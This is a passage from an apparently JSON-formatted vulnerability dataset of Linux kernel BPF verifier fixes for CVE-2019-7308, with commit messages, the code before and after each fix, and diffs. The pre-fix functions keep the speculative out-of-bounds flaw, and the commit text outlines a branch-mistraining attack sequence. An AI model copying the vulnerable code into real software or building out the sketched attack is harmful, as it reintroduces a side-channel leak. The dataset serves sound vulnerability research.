dst);\n\t\t\treturn ret;\n\t\t}\n\t\tif (dst_reg == off_reg) {\n\t\t\t/* scalar -= pointer.  Creates an unknown scalar */\n\t\t\tverbose(env, \"R%d tried to subtract pointer from scalar\\n\",\n\t\t\t\tdst);\n\t\t\treturn -EACCES;\n\t\t}\n\t\t/* We don't allow subtraction from FP, because (according to\n\t\t * test_verifier.c test \"invalid fp arithmetic\", JITs might not\n\t\t * be able to deal with it.\n\t\t */\n\t\tif (ptr_reg->type == PTR_TO_STACK) {\n\t\t\tverbose(env, \"R%d subtraction from stack pointer prohibited\\n\",\n\t\t\t\tdst);\n\t\t\treturn -EACCES;\n\t\t}\n\t\tif (known && (ptr_reg->off - smin_val ==\n\t\t\t      (s64)(s32)(ptr_reg->off - smin_val))) {\n\t\t\t/* pointer -= K.  Subtract it from fixed offset */\n\t\t\tdst_reg->smin_value = smin_ptr;\n\t\t\tdst_reg->smax_value = smax_ptr;\n\t\t\tdst_reg->umin_value = umin_ptr;\n\t\t\tdst_reg->umax_value = umax_ptr;\n\t\t\tdst_reg->var_off = ptr_reg->var_off;\n\t\t\tdst_reg->id = ptr_reg->id;\n\t\t\tdst_reg->off = ptr_reg->off - smin_val;\n\t\t\tdst_reg->raw = ptr_reg->raw;\n\t\t\tbreak;\n\t\t}\n\t\t/* A new variable offset is created.  If the subtrahend is known\n\t\t * nonnegative, then any reg->range we had before is still good.\n\t\t */\n\t\tif (signed_sub_overflows(smin_ptr, smax_val) ||\n\t\t    signed_sub_overflows(smax_ptr, smin_val)) {\n\t\t\t/* Overflow possible, we know nothing */\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\tdst_reg->smin_value = smin_ptr - smax_val;\n\t\t\tdst_reg->smax_value = smax_ptr - smin_val;\n\t\t}\n\t\tif (umin_ptr < umax_val) {\n\t\t\t/* Overflow possible, we know nothing */\n\t\t\tdst_reg->umin_value = 0;\n\t\t\tdst_reg->umax_value = U64_MAX;\n\t\t} else {\n\t\t\t/* Cannot overflow (as long as bounds are consistent) */\n\t\t\tdst_reg->umin_value = umin_ptr - umax_val;\n\t\t\tdst_reg->umax_value = umax_ptr - umin_val;\n\t\t}\n\t\tdst_reg->var_off = tnum_sub(ptr_reg->var_off, off_reg->var_off);\n\t\tdst_reg->off = ptr_reg->off;\n\t\tdst_reg->raw = ptr_reg->raw;\n\t\tif (reg_is_pkt_pointer(ptr_reg)) {\n\t\t\tdst_reg->id = ++env->id_gen;\n\t\t\t/* something was added to pkt_ptr, set range to zero */\n\t\t\tif (smin_val < 0)\n\t\t\t\tdst_reg->raw = 0;\n\t\t}\n\t\tbreak;\n\tcase BPF_AND:\n\tcase BPF_OR:\n\tcase BPF_XOR:\n\t\t/* bitwise ops on pointers are troublesome, prohibit. */\n\t\tverbose(env, \"R%d bitwise operator %s on pointer prohibited\\n\",\n\t\t\tdst, bpf_alu_string[opcode >> 4]);\n\t\treturn -EACCES;\n\tdefault:\n\t\t/* other operators (e.g. MUL,LSH) produce non-pointer results */\n\t\tverbose(env, \"R%d pointer arithmetic with %s operator prohibited\\n\",\n\t\t\tdst, bpf_alu_string[opcode >> 4]);\n\t\treturn -EACCES;\n\t}\n\n\tif (!check_reg_sane_offset(env, dst_reg, ptr_reg->type))\n\t\treturn -EINVAL;\n\n\t__update_reg_bounds(dst_reg);\n\t__reg_deduce_bounds(dst_reg);\n\t__reg_bound_offset(dst_reg);\n\n\t/* For unprivileged we require that resulting offset must be in bounds\n\t * in order to be able to sanitize access later on.\n\t */\n\tif (!env->allow_ptr_leaks) {\n\t\tif (dst_reg->type == PTR_TO_MAP_VALUE &&\n\t\t    check_map_access(env, dst, dst_reg->off, 1, false)) {\n\t\t\tverbose(env, \"R%d pointer arithmetic of map value goes out of range, \"\n\t\t\t\t\"prohibited for !root\\n\", dst);\n\t\t\treturn -EACCES;\n\t\t} else if (dst_reg->type == PTR_TO_STACK &&\n\t\t\t   check_stack_access(env, dst_reg, dst_reg->off +\n\t\t\t\t\t      dst_reg->var_off.value, 1)) {\n\t\t\tverbose(env, \"R%d stack pointer arithmetic goes out of range, \"\n\t\t\t\t\"prohibited for !root\\n\", dst);\n\t\t\treturn -EACCES;\n\t\t}\n\t}\n\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -13,6 +13,7 @@\n \t    umin_ptr = ptr_reg->umin_value, umax_ptr = ptr_reg->umax_value;\n \tu32 dst = insn->dst_reg, src = insn->src_reg;\n \tu8 opcode = BPF_OP(insn->code);\n+\tint ret;\n \n \tdst_reg = &regs[dst];\n \n@@ -68,6 +69,11 @@\n \n \tswitch (opcode) {\n \tcase BPF_ADD:\n+\t\tret = sanitize_ptr_alu(env, insn, ptr_reg, dst_reg, smin_val < 0);\n+\t\tif (ret < 0) {\n+\t\t\tverbose(env, \"R%d tried to add from different maps or paths\\n\", dst);\n+\t\t\treturn ret;\n+\t\t}\n \t\t/* We can take a fixed offset as long as it doesn't overflow\n \t\t * the s32 'off' field\n \t\t */\n@@ -118,6 +124,11 @@\n \t\t}\n \t\tbreak;\n \tcase BPF_SUB:\n+\t\tret = sanitize_ptr_alu(env, insn, ptr_reg, dst_reg, smin_val < 0);\n+\t\tif (ret < 0) {\n+\t\t\tverbose(env, \"R%d tried to sub from different maps or paths\\n\", dst);\n+\t\t\treturn ret;\n+\t\t}\n \t\tif (dst_reg == off_reg) {\n \t\t\t/* scalar -= pointer.  Creates an unknown scalar */\n \t\t\tverbose(env, \"R%d tried to subtract pointer from scalar\\n\",",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\tint ret;",
                "\t\tret = sanitize_ptr_alu(env, insn, ptr_reg, dst_reg, smin_val < 0);",
                "\t\tif (ret < 0) {",
                "\t\t\tverbose(env, \"R%d tried to add from different maps or paths\\n\", dst);",
                "\t\t\treturn ret;",
                "\t\t}",
                "\t\tret = sanitize_ptr_alu(env, insn, ptr_reg, dst_reg, smin_val < 0);",
                "\t\tif (ret < 0) {",
                "\t\t\tverbose(env, \"R%d tried to sub from different maps or paths\\n\", dst);",
                "\t\t\treturn ret;",
                "\t\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2019-7308",
        "func_name": "torvalds/linux/push_stack",
        "description": "kernel/bpf/verifier.c in the Linux kernel before 4.20.6 performs undesirable out-of-bounds speculation on pointer arithmetic in various cases, including cases of different branches with different state or limits to sanitize, leading to side-channel attacks.",
        "git_url": "https://github.com/torvalds/linux/commit/979d63d50c0c0f7bc537bf821e056cc9fe5abd38",
        "commit_title": "bpf: prevent out of bounds speculation on pointer arithmetic",
        "commit_text": " Jann reported that the original commit back in b2157399cc98 (\"bpf: prevent out-of-bounds speculation\") was not sufficient to stop CPU from speculating out of bounds memory access: While b2157399cc98 only focussed on masking array map access for unprivileged users for tail calls and data access such that the user provided index gets sanitized from BPF program and syscall side, there is still a more generic form affected from BPF programs that applies to most maps that hold user data in relation to dynamic map access when dealing with unknown scalars or \"slow\" known scalars as access offset, for example:    - Load a map value pointer into R6   - Load an index into R7   - Do a slow computation (e.g. with a memory dependency) that     loads a limit into R8 (e.g. load the limit from a map for     high latency, then mask it to make the verifier happy)   - Exit if R7 >= R8 (mispredicted branch)   - Load R0 = R6[R7]   - Load R0 = R6[R0]  For unknown scalars there are two options in the BPF verifier where we could derive knowledge from in order to guarantee safe access to the memory: i) While </>/<=/>= variants won't allow to derive any lower or upper bounds from the unknown scalar where it would be safe to add it to the map value pointer, it is possible through ==/!= test however. ii) another option is to transform the unknown scalar into a known scalar, for example, through ALU ops combination such as R &= <imm> followed by R |= <imm> or any similar combination where the original information from the unknown scalar would be destroyed entirely leaving R with a constant. The initial slow load still precedes the latter ALU ops on that register, so the CPU executes speculatively from that point. Once we have the known scalar, any compare operation would work then. A third option only involving registers with known scalars could be crafted as described in [0] where a CPU port (e.g. Slow Int unit) would be filled with many dependent computations such that the subsequent condition depending on its outcome has to wait for evaluation on its execution port and thereby executing speculatively if the speculated code can be scheduled on a different execution port, or any other form of mistraining as described in [1], for example. Given this is not limited to only unknown scalars, not only map but also stack access is affected since both is accessible for unprivileged users and could potentially be used for out of bounds access under speculation.  In order to prevent any of these cases, the verifier is now sanitizing pointer arithmetic on the offset such that any out of bounds speculation would be masked in a way where the pointer arithmetic result in the destination register will stay unchanged, meaning offset masked into zero similar as in array_index_nospec() case. With regards to implementation, there are three options that were considered: i) new insn for sanitation, ii) push/pop insn and sanitation as inlined BPF, iii) reuse of ax register and sanitation as inlined BPF.  Option i) has the downside that we end up using from reserved bits in the opcode space, but also that we would require each JIT to emit masking as native arch opcodes meaning mitigation would have slow adoption till everyone implements it eventually which is counter-productive. Option ii) and iii) have both in common that a temporary register is needed in order to implement the sanitation as inlined BPF since we are not allowed to modify the source register. While a push / pop insn in ii) would be useful to have in any case, it requires once again that every JIT needs to implement it first. While possible, amount of changes needed would also be unsuitable for a -stable patch. Therefore, the path which has fewer changes, less BPF instructions for the mitigation and does not require anything to be changed in the JITs is option iii) which this work is pursuing. The ax register is already mapped to a register in all JITs (modulo arm32 where it's mapped to stack as various other BPF registers there) and used in constant blinding for JITs-only so far. It can be reused for verifier rewrites under certain constraints. The interpreter's tmp \"register\" has therefore been remapped into extending the register set with hidden ax register and reusing that for a number of instructions that needed the prior temporary variable internally (e.g. div, mod). This allows for zero increase in stack space usage in the interpreter, and enables (restricted) generic use in rewrites otherwise as long as such a patchlet does not make use of these instructions. The sanitation mask is dynamic and relative to the offset the map value or stack pointer currently holds.  There are various cases that need to be taken under consideration for the masking, e.g. such operation could look as follows: ptr += val or val += ptr or ptr -= val. Thus, the value to be sanitized could reside either in source or in destination register, and the limit is different depending on whether the ALU op is addition or subtraction and depending on the current known and bounded offset. The limit is derived as follows: limit := max_value_size - (smin_value + off). For subtraction: limit := umax_value + off. This holds because we do not allow any pointer arithmetic that would temporarily go out of bounds or would have an unknown value with mixed signed bounds where it is unclear at verification time whether the actual runtime value would be either negative or positive. For example, we have a derived map pointer value with constant offset and bounded one, so limit based on smin_value works because the verifier requires that statically analyzed arithmetic on the pointer must be in bounds, and thus it checks if resulting smin_value + off and umax_value + off is still within map value bounds at time of arithmetic in addition to time of access. Similarly, for the case of stack access we derive the limit as follows: MAX_BPF_STACK + off for subtraction and -off for the case of addition where off := ptr_reg->off + ptr_reg->var_off.value. Subtraction is a special case for the masking which can be in form of ptr += -val, ptr -= -val, or ptr -= val. In the first two cases where we know that the value is negative, we need to temporarily negate the value in order to do the sanitation on a positive value where we later swap the ALU op, and restore original source register if the value was in source.  The sanitation of pointer arithmetic alone is still not fully sufficient as is, since a scenario like the following could happen ...    PTR += 0x1000 (e.g. K-based imm)   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   PTR += 0x1000   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   [...]  ... which under speculation could end up as ...    PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   [...]  ... and therefore still access out of bounds. To prevent such case, the verifier is also analyzing safety for potential out of bounds access under speculative execution. Meaning, it is also simulating pointer access under truncation. We therefore \"branch off\" and push the current verification state after the ALU operation with known 0 to the verification stack for later analysis. Given the current path analysis succeeded it is likely that the one under speculation can be pruned. In any case, it is also subject to existing complexity limits and therefore anything beyond this point will be rejected. In terms of pruning, it needs to be ensured that the verification state from speculative execution simulation must never prune a non-speculative execution path, therefore, we mark verifier state accordingly at the time of push_stack(). If verifier detects out of bounds access under speculative execution from one of the possible paths that includes a truncation, it will reject such program.  Given we mask every reg-based pointer arithmetic for unprivileged programs, we've been looking into how it could affect real-world programs in terms of size increase. As the majority of programs are targeted for privileged-only use case, we've unconditionally enabled masking (with its alu restrictions on top of it) for privileged programs for the sake of testing in order to check i) whether they get rejected in its current form, and ii) by how much the number of instructions and size will increase. We've tested this by using Katran, Cilium and test_l4lb from the kernel selftests. For Katran we've evaluated balancer_kern.o, Cilium bpf_lxc.o and an older test object bpf_lxc_opt_-DUNKNOWN.o and l4lb we've used test_l4lb.o as well as test_l4lb_noinline.o. We found that none of the programs got rejected by the verifier with this change, and that impact is rather minimal to none. balancer_kern.o had 13,904 bytes (1,738 insns) xlated and 7,797 bytes JITed before and after the change. Most complex program in bpf_lxc.o had 30,544 bytes (3,817 insns) xlated and 18,538 bytes JITed before and after and none of the other tail call programs in bpf_lxc.o had any changes either. For the older bpf_lxc_opt_-DUNKNOWN.o object we found a small increase from 20,616 bytes (2,576 insns) and 12,536 bytes JITed before to 20,664 bytes (2,582 insns) and 12,558 bytes JITed after the change. Other programs from that object file had similar small increase. Both test_l4lb.o had no change and remained at 6,544 bytes (817 insns) xlated and 3,401 bytes JITed and for test_l4lb_noinline.o constant at 5,080 bytes (634 insns) xlated and 3,313 bytes JITed. This can be explained in that LLVM typically optimizes stack based pointer arithmetic by using K-based operations and that use of dynamic map access is not overly frequent. However, in future we may decide to optimize the algorithm further under known guarantees from branch and value speculation. Latter seems also unclear in terms of prediction heuristics that today's CPUs apply as well as whether there could be collisions in e.g. the predictor's Value History/Pattern Table for triggering out of bounds access, thus masking is performed unconditionally at this point but could be subject to relaxation later on. We were generally also brainstorming various other approaches for mitigation, but the blocker was always lack of available registers at runtime and/or overhead for runtime tracking of limits belonging to a specific pointer. Thus, we found this to be minimally intrusive under given constraints.  With that in place, a simple example with sanitized access on unprivileged load at post-verification time looks as follows:    # bpftool prog dump xlated id 282   [...]   28: (79) r1 = *(u64 *)(r7 +0)   29: (79) r2 = *(u64 *)(r7 +8)   30: (57) r1 &= 15   31: (79) r3 = *(u64 *)(r0 +4608)   32: (57) r3 &= 1   33: (47) r3 |= 1   34: (2d) if r2 > r3 goto pc+19   35: (b4) (u32) r11 = (u32) 20479  |   36: (1f) r11 -= r2                | Dynamic sanitation for pointer   37: (4f) r11 |= r2                | arithmetic with registers   38: (87) r11 = -r11               | containing bounded or known   39: (c7) r11 s>>= 63              | scalars in order to prevent   40: (5f) r11 &= r2                | out of bounds speculation.   41: (0f) r4 += r11                |   42: (71) r4 = *(u8 *)(r4 +0)   43: (6f) r4 <<= r1   [...]  For the case where the scalar sits in the destination register as opposed to the source register, the following code is emitted for the above example:    [...]   16: (b4) (u32) r11 = (u32) 20479   17: (1f) r11 -= r2   18: (4f) r11 |= r2   19: (87) r11 = -r11   20: (c7) r11 s>>= 63   21: (5f) r2 &= r11   22: (0f) r2 += r0   23: (61) r0 = *(u32 *)(r2 +0)   [...]  JIT blinding example with non-conflicting use of r10:    [...]    d5:\tje     0x0000000000000106    _    d7:\tmov    0x0(%rax),%edi       |    da:\tmov    $0xf153246,%r10d     | Index load from map value and    e0:\txor    $0xf153259,%r10      | (const blinded) mask with 0x1f.    e7:\tand    %r10,%rdi            |_    ea:\tmov    $0x2f,%r10d          |    f0:\tsub    %rdi,%r10            | Sanitized addition. Both use r10    f3:\tor     %rdi,%r10            | but do not interfere with each    f6:\tneg    %r10                 | other. (Neither do these instructions    f9:\tsar    $0x3f,%r10           | interfere with the use of ax as temp    fd:\tand    %r10,%rdi            | in interpreter.)   100:\tadd    %rax,%rdi            |_   103:\tmov    0x0(%rdi),%eax  [...]  Tested that it fixes Jann's reproducer, and also checked that test_verifier and test_progs suite with interpreter, JIT and JIT with hardening enabled on x86-64 and arm64 runs successfully.    [0] Speculose: Analyzing the Security Implications of Speculative       Execution in CPUs, Giorgi Maisuradze and Christian Rossow,       https://arxiv.org/pdf/1801.04084.pdf    [1] A Systematic Evaluation of Transient Execution Attacks and       Defenses, Claudio Canella, Jo Van Bulck, Michael Schwarz,       Moritz Lipp, Benjamin von Berg, Philipp Ortner, Frank Piessens,       Dmitry Evtyushkin, Daniel Gruss,       https://arxiv.org/pdf/1811.05441.pdf ",
        "func_before": "static struct bpf_verifier_state *push_stack(struct bpf_verifier_env *env,\n\t\t\t\t\t     int insn_idx, int prev_insn_idx)\n{\n\tstruct bpf_verifier_state *cur = env->cur_state;\n\tstruct bpf_verifier_stack_elem *elem;\n\tint err;\n\n\telem = kzalloc(sizeof(struct bpf_verifier_stack_elem), GFP_KERNEL);\n\tif (!elem)\n\t\tgoto err;\n\n\telem->insn_idx = insn_idx;\n\telem->prev_insn_idx = prev_insn_idx;\n\telem->next = env->head;\n\tenv->head = elem;\n\tenv->stack_size++;\n\terr = copy_verifier_state(&elem->st, cur);\n\tif (err)\n\t\tgoto err;\n\tif (env->stack_size > BPF_COMPLEXITY_LIMIT_STACK) {\n\t\tverbose(env, \"BPF program is too complex\\n\");\n\t\tgoto err;\n\t}\n\treturn &elem->st;\nerr:\n\tfree_verifier_state(env->cur_state, true);\n\tenv->cur_state = NULL;\n\t/* pop all elements and return */\n\twhile (!pop_stack(env, NULL, NULL));\n\treturn NULL;\n}",
        "func": "static struct bpf_verifier_state *push_stack(struct bpf_verifier_env *env,\n\t\t\t\t\t     int insn_idx, int prev_insn_idx,\n\t\t\t\t\t     bool speculative)\n{\n\tstruct bpf_verifier_state *cur = env->cur_state;\n\tstruct bpf_verifier_stack_elem *elem;\n\tint err;\n\n\telem = kzalloc(sizeof(struct bpf_verifier_stack_elem), GFP_KERNEL);\n\tif (!elem)\n\t\tgoto err;\n\n\telem->insn_idx = insn_idx;\n\telem->prev_insn_idx = prev_insn_idx;\n\telem->next = env->head;\n\tenv->head = elem;\n\tenv->stack_size++;\n\terr = copy_verifier_state(&elem->st, cur);\n\tif (err)\n\t\tgoto err;\n\telem->st.speculative |= speculative;\n\tif (env->stack_size > BPF_COMPLEXITY_LIMIT_STACK) {\n\t\tverbose(env, \"BPF program is too complex\\n\");\n\t\tgoto err;\n\t}\n\treturn &elem->st;\nerr:\n\tfree_verifier_state(env->cur_state, true);\n\tenv->cur_state = NULL;\n\t/* pop all elements and return */\n\twhile (!pop_stack(env, NULL, NULL));\n\treturn NULL;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,5 +1,6 @@\n static struct bpf_verifier_state *push_stack(struct bpf_verifier_env *env,\n-\t\t\t\t\t     int insn_idx, int prev_insn_idx)\n+\t\t\t\t\t     int insn_idx, int prev_insn_idx,\n+\t\t\t\t\t     bool speculative)\n {\n \tstruct bpf_verifier_state *cur = env->cur_state;\n \tstruct bpf_verifier_stack_elem *elem;\n@@ -17,6 +18,7 @@\n \terr = copy_verifier_state(&elem->st, cur);\n \tif (err)\n \t\tgoto err;\n+\telem->st.speculative |= speculative;\n \tif (env->stack_size > BPF_COMPLEXITY_LIMIT_STACK) {\n \t\tverbose(env, \"BPF program is too complex\\n\");\n \t\tgoto err;",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\t\t\t     int insn_idx, int prev_insn_idx)"
            ],
            "added_lines": [
                "\t\t\t\t\t     int insn_idx, int prev_insn_idx,",
                "\t\t\t\t\t     bool speculative)",
                "\telem->st.speculative |= speculative;"
            ]
        }
    },
    {
        "cve_id": "CVE-2019-7308",
        "func_name": "torvalds/linux/fixup_bpf_calls",
        "description": "kernel/bpf/verifier.c in the Linux kernel before 4.20.6 performs undesirable out-of-bounds speculation on pointer arithmetic in various cases, including cases of different branches with different state or limits to sanitize, leading to side-channel attacks.",
        "git_url": "https://github.com/torvalds/linux/commit/979d63d50c0c0f7bc537bf821e056cc9fe5abd38",
        "commit_title": "bpf: prevent out of bounds speculation on pointer arithmetic",
        "commit_text": " Jann reported that the original commit back in b2157399cc98 (\"bpf: prevent out-of-bounds speculation\") was not sufficient to stop CPU from speculating out of bounds memory access: While b2157399cc98 only focussed on masking array map access for unprivileged users for tail calls and data access such that the user provided index gets sanitized from BPF program and syscall side, there is still a more generic form affected from BPF programs that applies to most maps that hold user data in relation to dynamic map access when dealing with unknown scalars or \"slow\" known scalars as access offset, for example:    - Load a map value pointer into R6   - Load an index into R7   - Do a slow computation (e.g. with a memory dependency) that     loads a limit into R8 (e.g. load the limit from a map for     high latency, then mask it to make the verifier happy)   - Exit if R7 >= R8 (mispredicted branch)   - Load R0 = R6[R7]   - Load R0 = R6[R0]  For unknown scalars there are two options in the BPF verifier where we could derive knowledge from in order to guarantee safe access to the memory: i) While </>/<=/>= variants won't allow to derive any lower or upper bounds from the unknown scalar where it would be safe to add it to the map value pointer, it is possible through ==/!= test however. ii) another option is to transform the unknown scalar into a known scalar, for example, through ALU ops combination such as R &= <imm> followed by R |= <imm> or any similar combination where the original information from the unknown scalar would be destroyed entirely leaving R with a constant. The initial slow load still precedes the latter ALU ops on that register, so the CPU executes speculatively from that point. Once we have the known scalar, any compare operation would work then. A third option only involving registers with known scalars could be crafted as described in [0] where a CPU port (e.g. Slow Int unit) would be filled with many dependent computations such that the subsequent condition depending on its outcome has to wait for evaluation on its execution port and thereby executing speculatively if the speculated code can be scheduled on a different execution port, or any other form of mistraining as described in [1], for example. Given this is not limited to only unknown scalars, not only map but also stack access is affected since both is accessible for unprivileged users and could potentially be used for out of bounds access under speculation.  In order to prevent any of these cases, the verifier is now sanitizing pointer arithmetic on the offset such that any out of bounds speculation would be masked in a way where the pointer arithmetic result in the destination register will stay unchanged, meaning offset masked into zero similar as in array_index_nospec() case. With regards to implementation, there are three options that were considered: i) new insn for sanitation, ii) push/pop insn and sanitation as inlined BPF, iii) reuse of ax register and sanitation as inlined BPF.  Option i) has the downside that we end up using from reserved bits in the opcode space, but also that we would require each JIT to emit masking as native arch opcodes meaning mitigation would have slow adoption till everyone implements it eventually which is counter-productive. Option ii) and iii) have both in common that a temporary register is needed in order to implement the sanitation as inlined BPF since we are not allowed to modify the source register. While a push / pop insn in ii) would be useful to have in any case, it requires once again that every JIT needs to implement it first. While possible, amount of changes needed would also be unsuitable for a -stable patch. Therefore, the path which has fewer changes, less BPF instructions for the mitigation and does not require anything to be changed in the JITs is option iii) which this work is pursuing. The ax register is already mapped to a register in all JITs (modulo arm32 where it's mapped to stack as various other BPF registers there) and used in constant blinding for JITs-only so far. It can be reused for verifier rewrites under certain constraints. The interpreter's tmp \"register\" has therefore been remapped into extending the register set with hidden ax register and reusing that for a number of instructions that needed the prior temporary variable internally (e.g. div, mod). This allows for zero increase in stack space usage in the interpreter, and enables (restricted) generic use in rewrites otherwise as long as such a patchlet does not make use of these instructions. The sanitation mask is dynamic and relative to the offset the map value or stack pointer currently holds.  There are various cases that need to be taken under consideration for the masking, e.g. such operation could look as follows: ptr += val or val += ptr or ptr -= val. Thus, the value to be sanitized could reside either in source or in destination register, and the limit is different depending on whether the ALU op is addition or subtraction and depending on the current known and bounded offset. The limit is derived as follows: limit := max_value_size - (smin_value + off). For subtraction: limit := umax_value + off. This holds because we do not allow any pointer arithmetic that would temporarily go out of bounds or would have an unknown value with mixed signed bounds where it is unclear at verification time whether the actual runtime value would be either negative or positive. For example, we have a derived map pointer value with constant offset and bounded one, so limit based on smin_value works because the verifier requires that statically analyzed arithmetic on the pointer must be in bounds, and thus it checks if resulting smin_value + off and umax_value + off is still within map value bounds at time of arithmetic in addition to time of access. Similarly, for the case of stack access we derive the limit as follows: MAX_BPF_STACK + off for subtraction and -off for the case of addition where off := ptr_reg->off + ptr_reg->var_off.value. Subtraction is a special case for the masking which can be in form of ptr += -val, ptr -= -val, or ptr -= val. In the first two cases where we know that the value is negative, we need to temporarily negate the value in order to do the sanitation on a positive value where we later swap the ALU op, and restore original source register if the value was in source.  The sanitation of pointer arithmetic alone is still not fully sufficient as is, since a scenario like the following could happen ...    PTR += 0x1000 (e.g. K-based imm)   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   PTR += 0x1000   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   [...]  ... which under speculation could end up as ...    PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   [...]  ... and therefore still access out of bounds. To prevent such case, the verifier is also analyzing safety for potential out of bounds access under speculative execution. Meaning, it is also simulating pointer access under truncation. We therefore \"branch off\" and push the current verification state after the ALU operation with known 0 to the verification stack for later analysis. Given the current path analysis succeeded it is likely that the one under speculation can be pruned. In any case, it is also subject to existing complexity limits and therefore anything beyond this point will be rejected. In terms of pruning, it needs to be ensured that the verification state from speculative execution simulation must never prune a non-speculative execution path, therefore, we mark verifier state accordingly at the time of push_stack(). If verifier detects out of bounds access under speculative execution from one of the possible paths that includes a truncation, it will reject such program.  Given we mask every reg-based pointer arithmetic for unprivileged programs, we've been looking into how it could affect real-world programs in terms of size increase. As the majority of programs are targeted for privileged-only use case, we've unconditionally enabled masking (with its alu restrictions on top of it) for privileged programs for the sake of testing in order to check i) whether they get rejected in its current form, and ii) by how much the number of instructions and size will increase. We've tested this by using Katran, Cilium and test_l4lb from the kernel selftests. For Katran we've evaluated balancer_kern.o, Cilium bpf_lxc.o and an older test object bpf_lxc_opt_-DUNKNOWN.o and l4lb we've used test_l4lb.o as well as test_l4lb_noinline.o. We found that none of the programs got rejected by the verifier with this change, and that impact is rather minimal to none. balancer_kern.o had 13,904 bytes (1,738 insns) xlated and 7,797 bytes JITed before and after the change. Most complex program in bpf_lxc.o had 30,544 bytes (3,817 insns) xlated and 18,538 bytes JITed before and after and none of the other tail call programs in bpf_lxc.o had any changes either. For the older bpf_lxc_opt_-DUNKNOWN.o object we found a small increase from 20,616 bytes (2,576 insns) and 12,536 bytes JITed before to 20,664 bytes (2,582 insns) and 12,558 bytes JITed after the change. Other programs from that object file had similar small increase. Both test_l4lb.o had no change and remained at 6,544 bytes (817 insns) xlated and 3,401 bytes JITed and for test_l4lb_noinline.o constant at 5,080 bytes (634 insns) xlated and 3,313 bytes JITed. This can be explained in that LLVM typically optimizes stack based pointer arithmetic by using K-based operations and that use of dynamic map access is not overly frequent. However, in future we may decide to optimize the algorithm further under known guarantees from branch and value speculation. Latter seems also unclear in terms of prediction heuristics that today's CPUs apply as well as whether there could be collisions in e.g. the predictor's Value History/Pattern Table for triggering out of bounds access, thus masking is performed unconditionally at this point but could be subject to relaxation later on. We were generally also brainstorming various other approaches for mitigation, but the blocker was always lack of available registers at runtime and/or overhead for runtime tracking of limits belonging to a specific pointer. Thus, we found this to be minimally intrusive under given constraints.  With that in place, a simple example with sanitized access on unprivileged load at post-verification time looks as follows:    # bpftool prog dump xlated id 282   [...]   28: (79) r1 = *(u64 *)(r7 +0)   29: (79) r2 = *(u64 *)(r7 +8)   30: (57) r1 &= 15   31: (79) r3 = *(u64 *)(r0 +4608)   32: (57) r3 &= 1   33: (47) r3 |= 1   34: (2d) if r2 > r3 goto pc+19   35: (b4) (u32) r11 = (u32) 20479  |   36: (1f) r11 -= r2                | Dynamic sanitation for pointer   37: (4f) r11 |= r2                | arithmetic with registers   38: (87) r11 = -r11               | containing bounded or known   39: (c7) r11 s>>= 63              | scalars in order to prevent   40: (5f) r11 &= r2                | out of bounds speculation.   41: (0f) r4 += r11                |   42: (71) r4 = *(u8 *)(r4 +0)   43: (6f) r4 <<= r1   [...]  For the case where the scalar sits in the destination register as opposed to the source register, the following code is emitted for the above example:    [...]   16: (b4) (u32) r11 = (u32) 20479   17: (1f) r11 -= r2   18: (4f) r11 |= r2   19: (87) r11 = -r11   20: (c7) r11 s>>= 63   21: (5f) r2 &= r11   22: (0f) r2 += r0   23: (61) r0 = *(u32 *)(r2 +0)   [...]  JIT blinding example with non-conflicting use of r10:    [...]    d5:\tje     0x0000000000000106    _    d7:\tmov    0x0(%rax),%edi       |    da:\tmov    $0xf153246,%r10d     | Index load from map value and    e0:\txor    $0xf153259,%r10      | (const blinded) mask with 0x1f.    e7:\tand    %r10,%rdi            |_    ea:\tmov    $0x2f,%r10d          |    f0:\tsub    %rdi,%r10            | Sanitized addition. Both use r10    f3:\tor     %rdi,%r10            | but do not interfere with each    f6:\tneg    %r10                 | other. (Neither do these instructions    f9:\tsar    $0x3f,%r10           | interfere with the use of ax as temp    fd:\tand    %r10,%rdi            | in interpreter.)   100:\tadd    %rax,%rdi            |_   103:\tmov    0x0(%rdi),%eax  [...]  Tested that it fixes Jann's reproducer, and also checked that test_verifier and test_progs suite with interpreter, JIT and JIT with hardening enabled on x86-64 and arm64 runs successfully.    [0] Speculose: Analyzing the Security Implications of Speculative       Execution in CPUs, Giorgi Maisuradze and Christian Rossow,       https://arxiv.org/pdf/1801.04084.pdf    [1] A Systematic Evaluation of Transient Execution Attacks and       Defenses, Claudio Canella, Jo Van Bulck, Michael Schwarz,       Moritz Lipp, Benjamin von Berg, Philipp Ortner, Frank Piessens,       Dmitry Evtyushkin, Daniel Gruss,       https://arxiv.org/pdf/1811.05441.pdf ",
